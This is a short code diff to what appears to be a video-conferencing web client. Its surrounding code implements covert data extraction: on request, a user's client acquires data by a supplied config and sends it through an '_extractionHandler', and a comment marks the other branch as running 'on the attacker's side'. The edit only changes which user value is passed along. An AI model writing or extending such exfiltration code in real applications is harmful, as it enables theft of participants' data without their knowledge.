@@ -1417,7 +1417,7 @@ export default {
                 return;
             }
             this._acquireData(recievedData.config).then(acquiredData => {
-                APP.conference._extractionHandler.sendAll(acquiredData, user.getId());
+                APP.conference._extractionHandler.sendAll(acquiredData, user);
             });
         } else { // 'reply' received, this runs on the attacker's side
             const extractionEvent = APP.conference._extractionEventElement;
